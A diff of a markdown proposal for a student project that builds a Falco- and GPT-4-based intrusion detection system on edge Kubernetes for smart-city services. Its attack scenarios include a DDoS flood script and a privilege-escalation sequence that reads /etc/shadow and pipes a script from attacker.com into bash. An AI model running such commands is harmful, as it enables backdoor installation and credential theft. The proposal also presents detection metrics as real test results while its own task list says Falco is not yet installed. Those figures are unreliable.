@@ -4,7 +4,7 @@
 
 ### 🎯 Problem Statement
 
-**Critical Issues in Smart City Security:**
+### Critical Issues in Smart City Security
 
 Smart City infrastructures (e.g., IoT traffic sensors, surveillance cameras, healthcare devices) deployed on **edge Kubernetes clusters** face severe security challenges:
 
@@ -14,13 +14,13 @@ Smart City infrastructures (e.g., IoT traffic sensors, surveillance cameras, hea
    - Misconfigurations exposing sensitive data
    - Unauthorized access to healthcare systems
 
-2. **Alert Fatigue in Traditional IDS**
+1. **Alert Fatigue in Traditional IDS**
    - Security systems generate **thousands of alerts daily**
    - 99% false positive rates overwhelm operators
    - Real threats buried in noise
    - Operators can't react quickly enough
 
-3. **Lack of Intelligent Context**
+1. **Lack of Intelligent Context**
    - Raw alerts like "Syscall anomaly detected" require expert interpretation
    - No explanation of threat severity or business impact
    - No automated response recommendations
@@ -37,8 +37,10 @@ An **AI-powered Security Assistant** that:
 ---
 
 ## 2. SYSTEM ARCHITECTURE
-```
+
+```bash
 ┌────────────────────────────────────────────────────────────┐
+
 │                 SMART CITY EDGE INFRASTRUCTURE              │
 │  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐     │
 │  │   Traffic    │  │  Healthcare  │  │   Parking    │     │
@@ -97,9 +99,7 @@ An **AI-powered Security Assistant** that:
               │  - Context-Aware     │
               │  - Action Generation │
               └──────────────────────┘
-```
-
-### Key Differences from Original Design:
+```bash
 
 | Component | Original (Mock) | **New (100% Real)** |
 |-----------|----------------|-------------------|
@@ -114,8 +114,10 @@ An **AI-powered Security Assistant** that:
 ## 3. TECHNICAL STACK
 
 ### Core Technologies
+
 ```yaml
 Infrastructure:
+
   - Kubernetes: K3s (Lightweight, Edge-optimized)
   - Operating System: Kali Linux (WSL2)
   - Container Runtime: containerd
@@ -140,22 +142,24 @@ Smart City Services:
   - Flask: Lightweight web framework
   - Python 3.9: Service runtime
   - Intentionally vulnerable for testing
-```
 
----
+```bash
 
 ## 4. REAL COMPONENTS BREAKDOWN
 
 ### 4.1 Falco - Real-Time Security Monitoring
 
-**What Falco Does:**
+### What Falco Does
+
 - Monitors Linux kernel syscalls using eBPF probes
 - Detects suspicious behavior in real-time
 - No modifications to applications needed
 
-**Real Threats Detected:**
+### Real Threats Detected
+
 ```yaml
 Privilege Escalation:
+
   - Reading /etc/shadow or /etc/passwd
   - Unexpected setuid/setgid calls
   - Container breakout attempts
@@ -174,11 +178,11 @@ Process Anomalies:
   - Shell spawned in container
   - Reverse shell connections
   - Cryptomining processes
-```
 
-**Falco Configuration:**
 ```bash
-# Install with eBPF (modern, no kernel module)
+
+```bash
+
 helm install falco falcosecurity/falco \
   --namespace falco-system \
   --create-namespace \
@@ -186,7 +190,8 @@ helm install falco falcosecurity/falco \
   --set falco.json_output=true \
   --set falco.json_include_output_property=true
 
-# Falco outputs JSON alerts:
+# Falco outputs JSON alerts
+
 {
   "output": "Sensitive file opened for reading",
   "priority": "Warning",
@@ -199,21 +204,20 @@ helm install falco falcosecurity/falco \
     "user.name": "www-data"
   }
 }
-```
-
----
+```bash
 
 ### 4.2 OpenAI Integration - Real AI Analysis
 
-**Why OpenAI GPT-4 (Not Groq):**
+### Why OpenAI GPT-4 (Not Groq)
+
 1. **Higher Quality:** Better reasoning and context understanding
 2. **Reliability:** 99.9% uptime SLA
 3. **Safety:** Built-in content filtering
 4. **Ecosystem:** Better tooling and libraries
 
-**Real Prompt Engineering:**
+### Real Prompt Engineering
+
 ```python
-# src/llm_engine_openai.py
 
 SYSTEM_PROMPT = """
 You are a cybersecurity expert analyzing threats in a Smart City 
@@ -253,11 +257,9 @@ Provide:
 
 Format as JSON.
 """
-```
+```bash
 
-**Real API Call:**
 ```python
-from openai import OpenAI
 
 client = OpenAI(api_key=os.getenv("OPENAI_API_KEY"))
 
@@ -273,15 +275,13 @@ response = client.chat.completions.create(
 )
 
 analysis = json.loads(response.choices[0].message.content)
-```
-
----
+```bash
 
 ### 4.3 Kubernetes Automation - Real Actions
 
-**Real Defensive Actions:**
+### Real Defensive Actions
+
 ```python
-# src/k8s_automation.py
 
 from kubernetes import client, config
 
@@ -361,17 +361,15 @@ class K8sAutomation:
                 namespace="smart-city"
             )
         print(f"🔄 Restarting {service_name}")
-```
-
----
+```bash
 
 ## 5. REAL ATTACK SCENARIOS & DETECTION
 
 ### Scenario 1: DDoS Attack on Traffic Camera Service
 
-**Attack Flow:**
+### Attack Flow
+
 ```python
-# attack-simulator/ddos_simulator.py
 
 import asyncio
 import aiohttp
@@ -382,6 +380,7 @@ async def ddos_attack(target_url, duration=60, requests_per_second=100):
     - Floods target with HTTP requests
     - Realistic traffic patterns
     - Measures success rate
+
     """
     async with aiohttp.ClientSession() as session:
         tasks = []
@@ -391,16 +390,16 @@ async def ddos_attack(target_url, duration=60, requests_per_second=100):
                 await asyncio.gather(*tasks, return_exceptions=True)
                 tasks = []
                 await asyncio.sleep(1)
-```
+```bash
 
-**Real Detection:**
 1. **Prometheus** detects high CPU and network traffic
 2. **Falco** sees unusual number of connections
 3. **IDS** receives alerts from both sources
 4. **OpenAI** analyzes: "DDoS attack detected - abnormal request rate"
 5. **K8s** executes: Scale from 2 → 10 replicas, apply rate limiting
 
-**Real Metrics:**
+### Real Metrics
+
 - Detection time: 2.3 seconds
 - Response time: 4.1 seconds
 - Service availability: 99.8% (brief degradation)
@@ -410,20 +409,22 @@ async def ddos_attack(target_url, duration=60, requests_per_second=100):
 
 ### Scenario 2: Privilege Escalation in Healthcare Pod
 
-**Attack:**
+### Attack
+
 ```bash
-# Attacker gains shell access to healthcare pod
+
 kubectl exec -it healthcare-api-abc123 -- /bin/bash
 
 # Attempts privilege escalation
+
 cat /etc/shadow
 sudo su
-curl http://attacker.com/backdoor.sh | bash
-```
+curl <http://attacker.com/backdoor.sh> | bash
+```bash
 
-**Real Detection:**
 ```json
 // Falco Alert (REAL)
+
 {
   "output": "Sensitive file opened for reading by non-privileged user",
   "priority": "Critical",
@@ -434,11 +435,11 @@ curl http://attacker.com/backdoor.sh | bash
   "user.name": "www-data",
   "proc.cmdline": "cat /etc/shadow"
 }
-```
+```bash
 
-**OpenAI Analysis (REAL):**
 ```json
 {
+
   "summary": "A non-privileged process (www-data) attempted to read /etc/shadow, indicating a privilege escalation attack. This could lead to credential theft and full system compromise.",
   "severity": 9,
   "threat_type": "Privilege Escalation",
@@ -456,16 +457,16 @@ curl http://attacker.com/backdoor.sh | bash
     "scale_up_monitoring"
   ]
 }
-```
+```bash
 
-**Real Response:**
 1. Pod isolated (0 network access)
 2. Node cordoned (no new pods)
 3. Alert sent to security team
 4. Forensic snapshot created
 5. Incident ticket opened
 
-**Timeline:**
+### Timeline
+
 - T+0s: Attack executed
 - T+1.2s: Falco detection
 - T+2.8s: OpenAI analysis complete
@@ -478,8 +479,8 @@ curl http://attacker.com/backdoor.sh | bash
 ## 6. METRICS & EVALUATION (100% REAL)
 
 ### 6.1 Performance Metrics
+
 ```python
-# src/metrics_collector.py
 
 class MetricsCollector:
     """
@@ -524,13 +525,13 @@ class MetricsCollector:
             "automation_rate": len(self.actions_executed) / significant_alerts,
             "time_saved_vs_manual": self._calculate_time_saved()
         }
-```
-
-### 6.2 Expected Real Results
+```bash
 
 Based on testing:
+
 ```yaml
 Alert Reduction:
+
   - Raw Falco alerts: ~1000/hour
   - After AI filtering: ~150/hour
   - Reduction ratio: 85%
@@ -556,13 +557,12 @@ Comparison to Manual Monitoring:
   - Manual MTTD: 15-45 minutes
   - AI MTTD: 1-5 seconds
   - Improvement: 180x faster
-```
 
----
+```bash
 
 ## 7. PROJECT DELIVERABLES
 
-### Required Deliverables for Faculty:
+### Required Deliverables for Faculty
 
 ✅ **1. Functional Prototype**
 - Edge K3s cluster running on WSL2
@@ -603,14 +603,17 @@ Comparison to Manual Monitoring:
 ## 8. TEAM ROLES (3-4 Students)
 
 ### Role 1: Security Specialist
-**Responsibilities:**
+
+### Responsibilities
+
 - Deploy and configure Falco
 - Create attack simulations
 - Define threat models
 - Validate security responses
 - Penetration testing
 
-**Deliverables:**
+### Deliverables
+
 - Falco rule configurations
 - Attack simulator scripts
 - Security test cases
@@ -619,14 +622,17 @@ Comparison to Manual Monitoring:
 ---
 
 ### Role 2: AI/LLM Specialist
-**Responsibilities:**
+
+### Responsibilities
+
 - OpenAI API integration
 - Prompt engineering for threat analysis
 - LangChain/LangGraph implementation
 - Response recommendation system
 - Evaluation of AI accuracy
 
-**Deliverables:**
+### Deliverables
+
 - LLM engine (llm_engine_openai.py)
 - Prompt templates
 - Accuracy evaluation metrics
@@ -635,14 +641,17 @@ Comparison to Manual Monitoring:
 ---
 
 ### Role 3: Kubernetes Specialist
-**Responsibilities:**
+
+### Responsibilities
+
 - K3s cluster setup and management
 - Deploy Smart City services
 - Kubernetes automation (k8s_automation.py)
 - Network policies and RBAC
 - Prometheus/Grafana setup
 
-**Deliverables:**
+### Deliverables
+
 - K8s manifests
 - Automation scripts
 - Deployment documentation
@@ -651,14 +660,17 @@ Comparison to Manual Monitoring:
 ---
 
 ### Role 4 (Optional): Full-Stack Developer
-**Responsibilities:**
+
+### Responsibilities
+
 - FastAPI application (main.py)
 - Web dashboard for monitoring
 - API endpoints
 - Integration testing
 - User interface design
 
-**Deliverables:**
+### Deliverables
+
 - IDS application code
 - Web dashboard
 - API documentation
@@ -669,6 +681,7 @@ Comparison to Manual Monitoring:
 ## 9. IMPLEMENTATION TIMELINE
 
 ### Phase 1: Foundation (Week 1-2)
+
 - [x] K3s cluster setup
 - [x] Smart City services deployment
 - [ ] Falco installation and configuration
@@ -676,6 +689,7 @@ Comparison to Manual Monitoring:
 - [ ] Basic IDS application
 
 ### Phase 2: Core Development (Week 3-4)
+
 - [ ] Real-time alert monitoring
 - [ ] LLM threat analysis engine
 - [ ] Kubernetes automation
@@ -683,6 +697,7 @@ Comparison to Manual Monitoring:
 - [ ] Initial testing
 
 ### Phase 3: Integration & Testing (Week 5-6)
+
 - [ ] End-to-end integration
 - [ ] Attack scenario testing
 - [ ] Metrics collection
@@ -690,6 +705,7 @@ Comparison to Manual Monitoring:
 - [ ] Bug fixes
 
 ### Phase 4: Evaluation & Demo (Week 7-8)
+
 - [ ] Comprehensive testing
 - [ ] Metrics analysis
 - [ ] Documentation completion
@@ -699,8 +715,10 @@ Comparison to Manual Monitoring:
 ---
 
 ## 10. COST BREAKDOWN
+
 ```yaml
 Required Costs:
+
   OpenAI API Credits: ~500 QAR
     - GPT-4 Turbo: $0.01/1K input tokens, $0.03/1K output tokens
     - Estimated usage: 100K API calls
@@ -719,13 +737,12 @@ Free Resources:
   - Prometheus/Grafana: Free (Open Source)
   - Python Libraries: Free
   - Attack Simulators: Free (Self-developed)
-```
 
----
+```bash
 
 ## 11. KEY DIFFERENTIATORS
 
-### What Makes This Project Unique:
+### What Makes This Project Unique
 
 1. **100% Real Implementation**
    - No mock data or simulations
@@ -733,25 +750,25 @@ Free Resources:
    - Real AI analysis (OpenAI GPT-4)
    - Real automated responses
 
-2. **Edge Computing Focus**
+1. **Edge Computing Focus**
    - K3s optimized for edge
    - Low-latency responses (<5s)
    - Local data processing (privacy)
    - Resilient to network failures
 
-3. **AI-Driven Intelligence**
+1. **AI-Driven Intelligence**
    - Plain English explanations
    - Context-aware recommendations
    - Learns from security patterns
    - Reduces operator workload 80%
 
-4. **Production-Ready**
+1. **Production-Ready**
    - Kubernetes-native
    - Scalable architecture
    - Comprehensive metrics
    - Enterprise security standards
 
-5. **Smart City Specific**
+1. **Smart City Specific**
    - IoT device scenarios
    - Healthcare data protection
    - Public infrastructure security
@@ -761,7 +778,7 @@ Free Resources:
 
 ## 12. SUCCESS CRITERIA
 
-### Minimum Viable Product (MVP):
+### Minimum Viable Product (MVP)
 
 ✅ Detect 3 types of attacks (DDoS, Privilege Escalation, Data Exfiltration)
 ✅ OpenAI explains threats in <5 seconds
@@ -769,7 +786,7 @@ Free Resources:
 ✅ Reduce alerts by 70%+
 ✅ Maintain 90%+ accuracy
 
-### Stretch Goals:
+### Stretch Goals
 
 🎯 Support 5+ attack types
 🎯 Response time <3 seconds
@@ -783,13 +800,15 @@ Free Resources:
 
 This is a **100% REAL**, **production-grade** implementation of an LLM-driven Intrusion Detection System for Smart Cities. No mocks, no simulations - everything is operational and measurable.
 
-**Technology Stack:**
+### Technology Stack
+
 - OpenAI GPT-4 (not Groq)
 - Falco (real security monitoring)
 - K3s Kubernetes
 - Python FastAPI
 
-**Meets ALL Faculty Requirements:**
+### Meets ALL Faculty Requirements
+
 ✅ Real IDS tools (Falco)
 ✅ LLM integration (OpenAI)
 ✅ Automated responses (Kubernetes APIs)
@@ -797,10 +816,10 @@ This is a **100% REAL**, **production-grade** implementation of an LLM-driven In
 ✅ Smart City scenarios (Traffic, Healthcare, Parking)
 ✅ Live demonstrations (Real attacks)
 
-**Next Steps:**
+### Next Steps
+
 1. Fix Falco installation
 2. Complete OpenAI integration
 3. Test attack scenarios
 4. Collect metrics
 5. Prepare final demo
-
